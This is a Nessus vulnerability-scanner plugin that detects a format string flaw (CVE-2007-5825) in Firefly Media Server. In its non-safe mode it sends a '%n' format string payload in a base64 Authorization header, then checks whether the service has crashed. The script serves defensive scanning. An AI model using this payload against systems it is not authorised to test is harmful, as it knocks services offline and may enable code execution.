#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(27619);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2007-5825");
  script_bugtraq_id(26310);
  script_osvdb_id(45286);

  script_name(english:"Firefly Media Server webserver.c ws_addarg Function /xml-rpc Authorization Header Remote Format String");
  script_summary(english:"Sends a specially crafted Authorization request header");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a format string vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Firefly Media Server, also known as
mt-daapd, a media streaming server. 

The version of Firefly Media Server installed on the remote host
apparently fails to sanitize user-supplied input before using it as
the format string in a call to 'vsnprintf'' in 'src/webserver.c'. 
Using a specially crafted HTTP Authorization request header, an
unauthenticated, remote attacker can leverage this issue to crash the
affected service or to execute arbitrary code on the affected system,
subject to the privileges under which the service operates." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/483209/30/0/threaded" );
  # http://sourceforge.net/project/shownotes.php?release_id=548679&group_id=98211
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bd56a4e9" );
 script_set_attribute(attribute:"solution", value:
"Either disable the service or upgrade to Firefly Media Server 0.2.4.1
or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
 script_cwe_id(134);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/11/03");
 script_cvs_date("$Date: 2016/05/05 16:01:14 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:firefly:media_server");
script_end_attributes();


  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 3689);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:3689, embedded: 1);

# Make sure it looks like Firefly / mt-daapd.
banner = get_http_banner(port:port);
if (!banner || "mt-daapd/" >!< banner) exit(0);


# Try to exploit the issue.
if (safe_checks())
{
  auth2 = "Basic";
}
else
{
  if (report_paranoia < 2) exit(0);

  exploit = "%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n";
  auth2 = string("Basic ", base64(str:exploit+":"+SCRIPT_NAME));
}

url = "/xml-rpc?method=stats";
w = http_send_recv3(method:"GET", item:url, port:port,
  add_headers: make_array("Authorization", auth2));

if (isnull(w))
 res = NULL;
else
 res = strcat(w[0], w[1], '\r\n', w[2]);


# If safe checks are enabled...
if (safe_checks())
{
  # there's a problem if we see a response with an invalid argument error.
  if (!isnull(res) && "<br>Error: Invalid argument" >< res) security_hole(port);
}
# Otherwise...
else
{
  # There's a problem if the server is down.
  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) security_hole(port);
}

